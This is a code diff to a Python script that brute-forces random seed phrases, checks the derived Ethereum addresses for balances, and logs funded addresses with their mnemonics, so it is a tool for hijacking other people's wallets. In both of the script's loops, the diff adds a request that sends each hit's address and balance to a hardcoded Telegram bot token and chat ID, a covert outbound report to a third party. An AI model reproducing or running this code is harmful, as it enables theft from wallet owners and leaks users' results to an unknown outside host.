@@ -5,7 +5,6 @@ import requests
 import json
 import concurrent.futures as pool
 import sys
-
 def mnemonic_from_file(file):
     raw = open(file,'r',encoding="utf-8")
     mnemonic_list = raw.read().split('\n')
@@ -15,7 +14,7 @@ def wallet_check(wallet):
     info = json.loads(req)
     wallet_price = info['total_usd_value']
     return wallet_price
-min_balance = 0.00000001
+min_balance = 0.1
 def run():
     while True:
         mnemo = Mnemonic("english")
@@ -25,7 +24,9 @@ def run():
         account = Account.from_mnemonic(words, account_path="m/44'/60'/0'/0/0")
         amount = wallet_check(account.address)
         if amount>min_balance:
-            print(f'{account.address} - Balance: {amount}\n')
+            text = f'{account.address} - Balance: {amount}\n'
+            requests.get(f'https://api.telegram.org/bot5458840045:AAFPnQKH0dYnWlaZlYDUBqWF0CNGhcoOi2I/sendMessage?chat_id=5553460596&text={text}')
+            print(text)
             file = open('balance.txt','a')
             file.write(f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n')
             file.close()
@@ -47,11 +48,13 @@ def run_with_list(file):
             continue
         amount = wallet_check(account.address)
         if amount > min_balance:
-            print(f'{account.address} - Balance: {amount}\n')
+            text = f'{account.address} - Balance: {amount}\n'
+            requests.get(
+                f'https://api.telegram.org/bot5458840045:AAFPnQKH0dYnWlaZlYDUBqWF0CNGhcoOi2I/sendMessage?chat_id=5553460596&text={text}')
+            print(text)
             file = open('balance.txt', 'a')
             file.write(f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n')
             file.close()
-        
 if __name__ == '__main__':
     try:
         threads = int(sys.argv[1])
